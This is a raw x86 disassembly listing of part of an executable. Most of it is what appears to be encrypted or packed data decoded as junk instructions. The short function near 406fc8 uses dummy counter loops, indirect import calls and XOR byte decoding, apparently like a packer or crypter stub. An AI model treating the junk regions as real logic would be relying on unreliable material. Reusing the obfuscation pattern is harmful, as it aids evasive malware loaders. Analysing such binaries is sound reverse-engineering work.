  406a13:	and    eax,0x7a622977
  406a18:	ja     0x406a21
  406a1a:	push   cs
  406a1b:	jae    0x406a79
  406a1d:	dec    esp
  406a1e:	out    dx,eax
  406a1f:	pop    edx
  406a20:	jmp    0x406a56
  406a22:	cmp    eax,0xb63ce27e
  406a27:	mov    esp,DWORD PTR [ebp+0x25]
  406a2a:	mov    ebp,0xa20b7272
  406a2f:	or     esi,esp
  406a31:	or     BYTE PTR [ecx],dl
  406a33:	out    0xe4,al
  406a35:	pop    eax
  406a36:	add    BYTE PTR [eax],dl
  406a38:	cmp    dl,BYTE PTR [eax]
  406a3a:	cmp    eax,0xbcf7fb44
  406a3f:	mov    esi,0x9c9e0dfd
  406a44:	adc    BYTE PTR es:[esi-0x287f7ea1],cl
  406a4b:	into   
  406a4c:	inc    edx
  406a4d:	in     al,dx
  406a4e:	sbb    al,0xa0
  406a50:	mov    ch,0x47
  406a52:	xor    al,0x58
  406a54:	in     al,dx
  406a55:	sar    DWORD PTR [ebx+0x36],1
  406a58:	push   ecx
  406a59:	push   ecx
  406a5a:	push   ecx
  406a5b:	push   ecx
  406a5c:	jecxz  0x406a30
  406a5e:	imul   esp,DWORD PTR [esi+0xb],0xffffffef
  406a62:	inc    edi
  406a63:	fstp   st(2)
  406a65:	adc    edx,ecx
  406a67:	xor    BYTE PTR [esi],ch
  406a69:	stc    
  406a6a:	jb     0x406adc
  406a6c:	das    
  406a6d:	push   ebx
  406a6e:	lock mov bl,0x13
  406a71:	adc    al,0x55
  406a73:	xchg   edx,eax
  406a74:	xchg   ebp,esi
  406a76:	or     BYTE PTR [edx-0x23],bh
  406a79:	scas   eax,DWORD PTR es:[edi]
  406a7a:	inc    ebp
  406a7b:	jae    0x406af1
  406a7d:	sahf   
  406a7e:	mov    edi,0xa05603b5
  406a83:	add    eax,esi
  406a85:	lea    ebx,[ecx+0x78]
  406a88:	and    ch,BYTE PTR [eax]
  406a8a:	xchg   ecx,eax
  406a8b:	stos   BYTE PTR es:[edi],al
  406a8c:	repz (bad) 
  406a8e:	sub    eax,0x1b6c80d7
  406a93:	lahf   
  406a94:	les    esp,FWORD PTR [esi+ebx*2+0x21aa04aa]
  406a9b:	xlat   BYTE PTR ds:[ebx]
  406a9c:	jecxz  0x406a5c
  406a9e:	xor    DWORD PTR [ecx],0xfb494f41
  406aa4:	jp     0x406a7a
  406aa6:	adc    al,0x78
  406aa8:	aas    
  406aa9:	pop    eax
  406aaa:	cli    
  406aab:	leave  
  406aac:	xchg   esp,eax
  406aad:	sbb    eax,0x900b18c4
  406ab2:	add    ebx,DWORD PTR [esi]
  406ab4:	ret    
  406ab5:	pusha  
  406ab6:	sbb    BYTE PTR [ebx],0xc2
  406ab9:	push   esp
  406aba:	mov    edx,fs
  406abc:	ja     0x406b3a
  406abe:	mov    WORD PTR [edi],es
  406ac0:	sbb    esp,edx
  406ac2:	lods   al,BYTE PTR ds:[esi]
  406ac3:	in     eax,0x81
  406ac5:	mov    al,0xf
  406ac7:	pop    ss
  406ac8:	imul   esi,DWORD PTR [esi-0x3f],0x1f
  406acc:	cmp    esi,ebp
  406ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406acf:	mov    al,0x2b
  406ad1:	push   ebx
  406ad2:	test   eax,0x7fa1ca4e
  406ad7:	cmp    eax,0xf3b96560
  406adc:	push   eax
  406add:	jl     0x406b0b
  406adf:	mov    edi,DWORD PTR [ecx-0x5dfbb80b]
  406ae5:	dec    edi
  406ae6:	pop    ds
  406ae7:	paddsb mm0,QWORD PTR [ebx+0x70]
  406aeb:	stc    
  406aec:	adc    eax,0x117c4f3a
  406af1:	lds    esp,FWORD PTR [ebx+ecx*4-0xa9dde6]
  406af8:	mov    dl,0x99
  406afa:	pop    ecx
  406afb:	jmp    0x406ad6
  406afd:	rep ins BYTE PTR es:[edi],dx
  406aff:	enter  0xf652,0xc1
  406b03:	fisub  DWORD PTR [ecx-0xd84e31c]
  406b09:	ds cmp dl,bl
  406b0c:	repnz dec ebx
  406b0e:	jb     0x406b72
  406b10:	cli    
  406b11:	icebp  
  406b12:	and    ah,BYTE PTR [edi+0x67d54e83]
  406b18:	fs push edx
  406b1a:	lock cdq 
  406b1c:	push   es
  406b1d:	cs fcomp st(3)
  406b20:	jno    0x406b0d
  406b22:	pop    esi
  406b23:	mov    dl,0xc
  406b25:	sub    BYTE PTR [eax],dl
  406b27:	int3   
  406b28:	xchg   edi,eax
  406b29:	pop    esi
  406b2a:	pop    esi
  406b2b:	fldl2t 
  406b2d:	popa   
  406b2e:	add    ebp,DWORD PTR [esi-0x35369677]
  406b34:	push   esi
  406b35:	xchg   BYTE PTR [edx+0x5],ah
  406b38:	ret    0x6501
  406b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b3c:	es jg  0x406b0c
  406b3f:	inc    ecx
  406b40:	hlt    
  406b41:	ds pop ebp
  406b43:	mov    ch,0x87
  406b45:	xor    ebx,ecx
  406b47:	sbb    BYTE PTR [eax+0x1e651aec],dl
  406b4d:	mov    bh,0xfa
  406b4f:	mov    ebp,0x69677e4a
  406b54:	out    dx,al
  406b55:	xor    BYTE PTR [eax-0x45],cl
  406b58:	jno    0x406b32
  406b5a:	dec    ecx
  406b5b:	ret    
  406b5c:	inc    ebp
  406b5d:	mov    ebx,0x6f9a018c
  406b62:	fwait
  406b63:	in     al,0xf2
  406b65:	sbb    eax,0x3966440
  406b6a:	xchg   esi,eax
  406b6b:	push   ebx
  406b6c:	push   esi
  406b6d:	je     0x406bcf
  406b6f:	sub    ah,BYTE PTR [esp+ebp*8-0x7cfac65e]
  406b76:	in     al,0x22
  406b78:	les    eax,FWORD PTR [ecx-0x65]
  406b7b:	test   DWORD PTR [eax+0x494d2d65],esp
  406b81:	and    BYTE PTR [esi-0x16c64a6e],ch
  406b87:	xchg   ebx,eax
  406b88:	cld    
  406b89:	sti    
  406b8a:	mov    WORD PTR [eax+0x788e4df9],es
  406b90:	xchg   esp,eax
  406b91:	ja     0x406b5a
  406b93:	das    
  406b94:	aad    0x38
  406b96:	xor    eax,0x1df1ea42
  406b9b:	dec    esi
  406b9c:	je     0x406b96
  406b9e:	retf   0x8d40
  406ba1:	fucomip st,st(3)
  406ba3:	aas    
  406ba4:	test   DWORD PTR [edx+ebx*4+0x7b],ebx
  406ba8:	add    ch,BYTE PTR [edi+0x7c433d2a]
  406bae:	icebp  
  406baf:	cdq    
  406bb0:	sub    BYTE PTR [edi],bh
  406bb2:	outs   dx,DWORD PTR ds:[esi]
  406bb3:	mov    eax,0x90880333
  406bb8:	les    esp,FWORD PTR [ecx+0x23fbb209]
  406bbe:	pminsw mm5,mm7
  406bc1:	es push ecx
  406bc3:	pop    eax
  406bc4:	and    cl,0xef
  406bc7:	iret   
  406bc8:	inc    edx
  406bc9:	addr16 fwait
  406bcb:	mov    edx,0x69d7114
  406bd0:	shl    BYTE PTR ds:0xc5ab0a9d,0xb6
  406bd7:	pop    edx
  406bd8:	fst    QWORD PTR [ecx+0x1cfc8ccd]
  406bde:	rol    DWORD PTR [ebx-0x71366455],0xd
  406be5:	ret    0xc4ed
  406be8:	icebp  
  406be9:	jns    0x406bc9
  406beb:	mov    WORD PTR [edx],fs
  406bed:	loope  0x406bef
  406bef:	je     0x406c20
  406bf1:	mov    DWORD PTR [eax],ebx
  406bf3:	push   ds
  406bf4:	cmp    BYTE PTR [edx+eax*1+0x21],dl
  406bf8:	push   es
  406bf9:	rcr    ebx,0x4d
  406bfc:	in     al,0xce
  406bfe:	mov    al,0xc8
  406c00:	push   cs
  406c01:	gs sti 
  406c03:	pop    es
  406c04:	or     bl,cl
  406c06:	call   0xa3e0:0x6a77af2
  406c0d:	and    al,0x22
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	sbb    ch,BYTE PTR ds:0xca389b24
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	cmc    
  406c34:	popf   
  406c35:	arpl   bx,di
  406c37:	out    0xcf,al
  406c39:	add    eax,0x48fca71e
  406c3e:	pop    ds
  406c3f:	icebp  
  406c40:	test   eax,0xcc1eb18d
  406c45:	mov    ds:0xcae2df5b,al
  406c4a:	enter  0x8f5a,0x37
  406c4e:	and    DWORD PTR [ebp-0x48289201],esp
  406c54:	and    DWORD PTR [eax],0xf264547
  406c5a:	jbe    0x406c69
  406c5c:	mov    WORD PTR [edx-0x56],?
  406c5f:	retf   
  406c60:	mov    dh,0x8d
  406c62:	test   al,0xb7
  406c64:	jge    0x406c0d
  406c66:	jg     0x406c99
  406c68:	jmp    0x9e5f:0xca957d0e
  406c6f:	je     0x406cdb
  406c71:	ins    DWORD PTR es:[edi],dx
  406c72:	mov    ebp,0x701f0980
  406c77:	mov    ds:0x9c12775,al
  406c7c:	mov    WORD PTR [edi-0x1e8a4fd2],?
  406c82:	aaa    
  406c83:	mov    dl,0x9f
  406c85:	push   edx
  406c86:	add    al,0x30
  406c88:	push   edi
  406c89:	pop    ecx
  406c8a:	push   ds
  406c8b:	adc    BYTE PTR [ebp-0x21],ch
  406c8e:	sub    DWORD PTR [ebx-0x3d],esp
  406c91:	cld    
  406c92:	ret    
  406c93:	add    eax,0x83e8dfd
  406c98:	es ins BYTE PTR es:[edi],dx
  406c9a:	shl    DWORD PTR [ebx+ebx*4-0x43],cl
  406c9e:	nop
  406c9f:	push   esi
  406ca0:	mov    ebx,0xd88ae74f
  406ca5:	cmp    BYTE PTR [esp+ebx*4-0x39],0xe4
  406caa:	jl     0x406cb8
  406cac:	loopne 0x406d12
  406cae:	fdivr  QWORD PTR [ebx-0x25]
  406cb1:	push   cs
  406cb2:	add    eax,DWORD PTR [edi-0x33]
  406cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb6:	outs   dx,DWORD PTR ds:[esi]
  406cb7:	adc    BYTE PTR [edx-0x38a177e1],0x52
  406cbe:	and    eax,0x2b0c9bed
  406cc3:	in     al,dx
  406cc4:	mov    edx,0xd85678f7
  406cc9:	mov    edx,0x84a78401
  406cce:	pop    ds
  406ccf:	jmp    0x406ce0
  406cd1:	test   BYTE PTR [ecx+0x53],dl
  406cd4:	in     eax,dx
  406cd5:	mov    BYTE PTR [ecx+0x2a1187bf],al
  406cdb:	cmp    ah,BYTE PTR [edx-0x63bf2bd4]
  406ce1:	dec    ecx
  406ce2:	ja     0x406d41
  406ce4:	jle    0x406cf9
  406ce6:	retf   
  406ce7:	dec    ebx
  406ce8:	in     eax,dx
  406ce9:	outs   dx,DWORD PTR ds:[esi]
  406cea:	push   ss
  406ceb:	fucom  st(7)
  406ced:	int    0xd3
  406cef:	or     al,0x73
  406cf1:	lea    edi,[edx]
  406cf3:	pushf  
  406cf4:	pop    es
  406cf5:	(bad)  
  406cf6:	in     eax,dx
  406cf7:	stos   BYTE PTR es:[edi],al
  406cf8:	dec    edx
  406cf9:	mov    ebx,0x7fde5d6e
  406cfe:	arpl   WORD PTR [esi+0x7d],cx
  406d01:	jmp    0x406c86
  406d03:	stc    
  406d04:	mov    ebx,0x522b000f
  406d09:	adc    DWORD PTR [edi-0x4b8dd258],ebx
  406d0f:	and    DWORD PTR [edi+0x278890f4],esi
  406d15:	jo     0x406d5c
  406d17:	es mov edx,0xbea3f7c9
  406d1d:	lods   eax,DWORD PTR ds:[esi]
  406d1e:	nop
  406d1f:	jno    0x406cf2
  406d21:	lods   al,BYTE PTR ds:[esi]
  406d22:	xchg   esi,eax
  406d23:	lock aas 
  406d25:	iret   
  406d26:	inc    esi
  406d27:	push   ecx
  406d28:	test   eax,0x98cbebd9
  406d2d:	shl    ch,cl
  406d2f:	imul   esp,DWORD PTR [eax-0x5eaa0a6f],0xa6928a1b
  406d39:	add    edx,DWORD PTR [edx+edx*1]
  406d3c:	inc    ebx
  406d3d:	mov    edi,0xd70594dd
  406d42:	aam    0x49
  406d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d45:	enter  0x3d0,0x8f
  406d49:	mov    eax,0x6b8a153d
  406d4e:	mov    edx,eax
  406d50:	mov    BYTE PTR [edx+0x5821751],ch
  406d56:	sbb    DWORD PTR [ecx+eax*4],0x36
  406d5a:	lds    edx,FWORD PTR [ecx]
  406d5c:	jp     0x406d0f
  406d5e:	movq   mm1,QWORD PTR [ecx+0x603eb439]
  406d65:	push   cs
  406d66:	and    DWORD PTR [edi-0x3c],edx
  406d69:	adc    dh,BYTE PTR [ecx-0x1f]
  406d6c:	(bad)  
  406d6d:	xchg   edi,eax
  406d6e:	push   edi
  406d6f:	ret    0xc14a
  406d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d73:	inc    edi
  406d74:	stc    
  406d75:	lock (bad) 
  406d77:	and    dl,BYTE PTR [esi]
  406d79:	scas   al,BYTE PTR es:[edi]
  406d7a:	test   BYTE PTR [eax-0x27],0x54
  406d7e:	push   ds
  406d7f:	test   al,0xd3
  406d81:	jne    0x406d89
  406d83:	push   edx
  406d84:	out    dx,eax
  406d85:	xor    ah,dh
  406d87:	cmp    eax,0x2976aedb
  406d8c:	idiv   BYTE PTR [edi]
  406d8e:	pop    esp
  406d8f:	shr    DWORD PTR ds:0x427cced7,0x1c
  406d96:	sbb    eax,0x3c21558
  406d9b:	pop    ds
  406d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d9d:	inc    ebx
  406d9e:	xchg   esi,eax
  406d9f:	scas   al,BYTE PTR es:[edi]
  406da0:	mov    al,0x74
  406da2:	and    DWORD PTR [eax],ebx
  406da4:	outs   dx,DWORD PTR ds:[esi]
  406da5:	jae    0x406d7d
  406da7:	ins    DWORD PTR es:[edi],dx
  406da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406da9:	stos   BYTE PTR es:[edi],al
  406daa:	push   eax
  406dab:	jecxz  0x406d82
  406dad:	hlt    
  406dae:	cmp    eax,0x5624f30e
  406db3:	add    DWORD PTR [ebx],ebx
  406db5:	jbe    0x406dd6
  406db7:	mov    WORD PTR [ecx-0x24],cs
  406dba:	push   ecx
  406dbb:	dec    ebp
  406dbc:	ss fs xchg ebx,eax
  406dbf:	popa   
  406dc0:	fwait
  406dc1:	cmp    al,0x22
  406dc3:	loop   0x406e32
  406dc5:	scas   al,BYTE PTR es:[edi]
  406dc6:	out    0xb1,eax
  406dc8:	ret    
  406dc9:	xchg   DWORD PTR [edx+0x6b],esi
  406dcc:	sbb    ebp,DWORD PTR [ebp-0x61452809]
  406dd2:	sub    cl,BYTE PTR [edi]
  406dd4:	mov    esi,0x422cf355
  406dd9:	mov    gs,WORD PTR [ecx]
  406ddb:	mov    ah,0xda
  406ddd:	push   esp
  406dde:	call   0x99c947b4
  406de3:	clc    
  406de4:	sahf   
  406de5:	pop    esi
  406de6:	pop    ds
  406de7:	sub    BYTE PTR [edi],al
  406de9:	lods   al,BYTE PTR ds:[esi]
  406dea:	ss sub eax,0x8fb5a9a5
  406df0:	fwait
  406df1:	mov    dl,0x87
  406df3:	push   esi
  406df4:	inc    ecx
  406df5:	push   ebx
  406df6:	in     eax,0x71
  406df8:	mov    ebx,0xa8ff547b
  406dfd:	lods   eax,DWORD PTR ds:[esi]
  406dfe:	mov    ebx,0x63876c27
  406e03:	in     al,0x6f
  406e05:	pop    edi
  406e06:	or     BYTE PTR [edx+eiz*2-0x77],ch
  406e0a:	fsub   DWORD PTR [esp+esi*4+0x292bcc0d]
  406e11:	or     al,0xf9
  406e13:	rol    BYTE PTR [ebp+0x35],cl
  406e16:	pop    ss
  406e17:	xor    eax,0x4b9fe5dc
  406e1c:	daa    
  406e1d:	sbb    eax,0xfddd0a1
  406e22:	adc    bh,BYTE PTR fs:[ebx-0x5489abe5]
  406e29:	(bad)  
  406e2b:	movzx  esp,BYTE PTR [ebx]
  406e2e:	mov    ch,0xf6
  406e30:	xchg   ebx,eax
  406e31:	pop    es
  406e32:	lea    esp,[edx-0x5b519d3e]
  406e38:	or     DWORD PTR [esi+0x5d8bca91],eax
  406e3e:	in     eax,0xae
  406e40:	add    DWORD PTR [eax],ebx
  406e42:	xor    esi,edi
  406e44:	pop    es
  406e45:	push   ecx
  406e46:	mov    al,0xde
  406e48:	jo     0x406ea2
  406e4a:	ror    edi,1
  406e4c:	gs loop 0x406ec8
  406e4f:	iret   
  406e50:	dec    eax
  406e51:	repz popa 
  406e53:	dec    esp
  406e54:	and    eax,0x3d791fe6
  406e59:	mov    cl,BYTE PTR [esi+0x64]
  406e5c:	ret    
  406e5d:	das    
  406e5e:	or     DWORD PTR [esi+0x4f96fffe],0x297774ba
  406e68:	aaa    
  406e69:	inc    esi
  406e6a:	sbb    DWORD PTR [edi-0x49938f0c],edx
  406e70:	ins    BYTE PTR es:[edi],dx
  406e71:	sbb    eax,0x35c7fda5
  406e76:	mov    ds:0x778e28b7,al
  406e7b:	sub    edi,ebp
  406e7d:	std    
  406e7e:	rcl    BYTE PTR [esi],1
  406e80:	sub    ebx,ebp
  406e82:	mov    edi,0x9dd05584
  406e87:	add    eax,0xe7b93e82
  406e8c:	js     0x406e23
  406e8e:	(bad)  
  406e8f:	jl     0x406e2d
  406e91:	sub    DWORD PTR [edx-0x602e6d42],esp
  406e97:	xchg   ebp,eax
  406e98:	pushf  
  406e99:	jne    0x406f0d
  406e9b:	cs mov eax,0x70c69ee3
  406ea1:	adc    BYTE PTR [ecx*8+0x2b41f8c3],dh
  406ea8:	js     0x406ebe
  406eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eab:	jno    0x406e88
  406ead:	pop    es
  406eae:	shl    ebx,0x11
  406eb1:	sti    
  406eb2:	out    0xfc,eax
  406eb4:	and    ah,0x82
  406eb7:	sti    
  406eb8:	add    ch,bl
  406eba:	out    0x49,al
  406ebc:	mov    edi,0x9bfe7bad
  406ec1:	add    BYTE PTR [edx],0xe8
  406ec4:	mov    esi,0xd6e54275
  406ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eca:	dec    ecx
  406ecb:	test   DWORD PTR [esi],edx
  406ecd:	in     eax,dx
  406ece:	jnp    0x406e78
  406ed0:	rcl    BYTE PTR [ecx-0x21],0x88
  406ed4:	imul   ecx,DWORD PTR [edx+0x70],0x4a
  406ed8:	sbb    DWORD PTR [esi-0x5c6ec477],eax
  406ede:	mov    esp,0xa7e25955
  406ee3:	sbb    BYTE PTR [esi+0x7fb7c5b4],0x36
  406eea:	enter  0xad1,0xd2
  406eee:	or     eax,0x964b0ca7
  406ef3:	aam    0xc2
  406ef5:	sub    bl,cl
  406ef7:	inc    edx
  406ef8:	xchg   DWORD PTR [edx+eax*4-0x4b5ea0f0],edi
  406eff:	jb     0x406f22
  406f01:	and    eax,0xb3be3ed9
  406f06:	scas   al,BYTE PTR es:[edi]
  406f07:	sub    DWORD PTR [edi+0x32a3f010],0x22bfba17
  406f11:	aad    0x4e
  406f13:	xchg   ecx,eax
  406f14:	pop    eax
  406f15:	imul   ebp,DWORD PTR [edx+0x8eed98c],0xffffffc8
  406f1c:	jo     0x406f4b
  406f1e:	jmp    0xbdc986ad
  406f23:	fiadd  DWORD PTR [ebx-0x20450cf4]
  406f29:	(bad)
  406f2c:	push   eax
  406f2d:	xor    dh,dl
  406f2f:	adc    bh,BYTE PTR [eax-0x1f7ebf0f]
  406f35:	jne    0x406fae
  406f37:	xor    DWORD PTR [ebx],eax
  406f39:	or     DWORD PTR [edi-0x72d21b30],edi
  406f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f40:	ss mov edx,esi
  406f43:	cmp    edi,DWORD PTR ds:0x370439eb
  406f49:	adc    al,0xb3
  406f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f4c:	add    dh,BYTE PTR [esi]
  406f4e:	mov    ah,0xc8
  406f50:	and    esp,DWORD PTR [esi]
  406f52:	stos   BYTE PTR es:[edi],al
  406f53:	ret    
  406f54:	(bad)  
  406f55:	imul   esp,DWORD PTR [edx-0x59],0x47
  406f59:	cmp    bh,ch
  406f5b:	sub    DWORD PTR [ecx-0x1a],ebp
  406f5e:	and    al,0x12
  406f60:	adc    DWORD PTR [edi+ebp*8],esi
  406f63:	mov    al,0x5e
  406f65:	adc    DWORD PTR [edx-0x49],edx
  406f68:	adc    edi,DWORD PTR [edi-0x6dfdf9cf]
  406f6e:	stos   DWORD PTR es:[edi],eax
  406f6f:	ja     0x406f5b
  406f71:	sahf   
  406f72:	pop    edi
  406f73:	mov    dh,0x2a
  406f75:	xchg   di,ax
  406f77:	lea    edi,[ecx-0x152e82e3]
  406f7d:	push   ebp
  406f7e:	sub    BYTE PTR [eax+esi*2+0x2feab410],ah
  406f85:	jmp    0x4c33:0xf29b8aa2
  406f8c:	or     al,BYTE PTR [edx]
  406f8e:	cmp    DWORD PTR [eax],esi
  406f90:	xor    eax,0x15be1321
  406f95:	out    0x2d,eax
  406f97:	sbb    dh,BYTE PTR [ebx+ecx*2-0x26646e1b]
  406f9e:	pop    ebp
  406f9f:	popf   
  406fa0:	add    eax,edx
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430496,0x19
  406fd8:	cmp    DWORD PTR ds:0x430496,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430496,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eac4
  406ffd:	cmp    DWORD PTR ds:0x430496,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430496
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430496,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430496
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430496,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430556,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43054a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee18,0x42ee20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eba4
  4070a9:	cmp    DWORD PTR ds:0x42ee1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43055a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ee28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ee28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ee28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ee28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ee28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ee24
  407123:	call   DWORD PTR ds:0x42eba8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4304ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430492,0x17
  407147:	cmp    DWORD PTR ds:0x430492,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430492,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430492
  407179:	dec    eax
  40717a:	mov    ds:0x430492,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x64a67cc6
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x4071cd
  4071b2:	xchg   esp,eax
  4071b3:	push   cs
  4071b4:	test   BYTE PTR [ebx+0xabe074d],dl
  4071ba:	es dec esi
  4071bc:	stc    
  4071bd:	int3   
  4071be:	repz in eax,dx
  4071c0:	inc    eax
  4071c1:	jns    0x40715e
  4071c3:	es pop esp
  4071c5:	cli    
  4071c6:	mov    fs,WORD PTR [edi]
  4071c8:	jmp    DWORD PTR [edi+0x16a5d241]
  4071ce:	test   ecx,ecx
  4071d0:	xchg   edx,edi
  4071d2:	and    DWORD PTR [edx+edi*2],ebp
  4071d5:	mov    cl,0x89
  4071d7:	into   
  4071d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071d9:	stos   DWORD PTR es:[edi],eax
  4071da:	arpl   WORD PTR [ebp+edx*2-0x9de91ee],si
  4071e1:	cmp    cl,ah
  4071e3:	sub    eax,0x11f3a7aa
  4071e8:	mov    esp,0xfd3271a3
  4071ed:	fbstp  TBYTE PTR [edi+0x5b37b1ee]
  4071f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071f4:	xor    ebp,DWORD PTR [edx-0x2c4f155]
  4071fa:	xchg   DWORD PTR ss:[ecx-0x66],ecx
  4071fe:	test   eax,0xbd6478f3
  407203:	pop    ds
  407204:	ins    DWORD PTR es:[edi],dx
  407205:	rcl    BYTE PTR [esi-0x42],1
  407208:	popf   
  407209:	and    DWORD PTR [eax-0x23],eax
  40720c:	test   DWORD PTR ds:0xabd1dbaa,0x843c5daa
  407216:	and    esp,DWORD PTR [ebx]
  407218:	cli    
  407219:	pop    ds
  40721a:	mov    bh,0xa4
  40721c:	div    BYTE PTR [eax]
  40721e:	pop    ds
  40721f:	push   eax
  407220:	leave  
  407221:	dec    esi
  407222:	inc    esi
  407223:	jge    0x40727e
  407225:	jno    0x40725f
  407227:	inc    esi
  407228:	imul   ebp,DWORD PTR ds:0xa316a00b,0x1
  40722f:	push   es
  407230:	pop    es
  407231:	bound  ecx,QWORD PTR ds:0xeae2ae9c
  407237:	push   esp
  407238:	mov    ebp,0xae47d6da
  40723d:	push   ebp
  40723e:	mov    ebx,0x7aa3dcfa
  407243:	push   eax
  407244:	push   edi
  407245:	and    BYTE PTR ds:0x4199feda,bh
  40724b:	cmp    esi,DWORD PTR [ecx-0x14]
  40724e:	jne    0x407248
  407250:	int3   
  407251:	std    
  407252:	push   edi
  407253:	dec    ebx
  407254:	push   edi
  407255:	sar    ebx,1
  407257:	or     DWORD PTR ds:0x28f686cc,ebx
  40725d:	xchg   edi,eax
  40725e:	mov    DWORD PTR [eax],ecx
  407260:	xchg   ebp,eax
  407261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407262:	xor    bh,al
  407264:	iret   
  407265:	arpl   WORD PTR [eax+0x5d142ec0],cx
  40726b:	push   ds
  40726c:	mov    ds:0xe6de24c1,eax
  407271:	sahf   
  407272:	mov    ebx,0xa43977f8
  407277:	xchg   BYTE PTR ds:0x590fa3a,dl
  40727d:	int3   
  40727e:	jmp    0x41cb:0x4574466a
  407285:	mov    ds:0xb826a328,al
  40728a:	inc    eax
  40728b:	pop    esi
  40728c:	sub    cl,BYTE PTR [esi+ebx*1]
  40728f:	xor    eax,0x7281c1f0
  407294:	sbb    ah,dh
  407296:	add    eax,0xdba2a447
  40729b:	lahf   
  40729c:	mov    esi,0xc1f33330
